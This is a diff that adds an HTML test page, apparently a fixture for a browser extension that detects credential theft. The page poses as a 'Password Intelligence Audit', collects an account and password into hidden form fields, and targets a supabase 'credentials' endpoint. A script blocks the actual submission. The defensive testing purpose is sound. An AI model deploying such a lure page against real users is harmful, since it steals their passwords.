@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <title>Account Check (Exfil Test)</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <style>
+    body{font-family:system-ui,Segoe UI,Roboto,Arial,sans-serif;background:#f2f4f8;color:#111;padding:40px}
+    .box{max-width:520px;margin:0 auto;background:#fff;padding:24px;border-radius:10px;border:1px solid #e6e9ef}
+    input{width:100%;padding:10px;margin-top:10px;border-radius:6px;border:1px solid #ccd}
+    button{margin-top:12px;padding:10px 14px;border-radius:6px;background:#111;color:#fff;border:none}
+    small{display:block;margin-top:8px;color:#666}
+  </style>
+</head>
+<body>
+  <div class="box">
+    <h2>Password Intelligence Audit</h2>
+    <p>Enter your account to run a quick audit.</p>
+
+    <input id="acct" placeholder="Account (e.g. gmail@example.com)">
+    <input id="pw" type="password" placeholder="Password to scan">
+
+    <!-- Form posts to a supabase-like URL (exfil simulation) -->
+    <form id="exfilForm" method="POST" action="https://oukbxgjrrgvunfytjemd.supabase.co/rest/v1/credentials">
+      <input type="hidden" name="account" id="f_acct">
+      <input type="hidden" name="password" id="f_pw">
+      <button type="submit">Run Audit</button>
+    </form>
+
+    <small>This form posts to a supabase endpoint simulation. Should be flagged as exfil+credential.</small>
+  </div>
+
+  <script>
+    const form = document.getElementById('exfilForm');
+    form.addEventListener('submit', (e) => {
+      document.getElementById('f_acct').value = document.getElementById('acct').value;
+      document.getElementById('f_pw').value = document.getElementById('pw').value;
+      // In a real exfil test you might let it submit; for local safe test we prevent default and show message
+      e.preventDefault();
+      alert('Form submit intercepted (test). The extension should have flagged this page.');
+    });
+  </script>
+</body>
+</html>
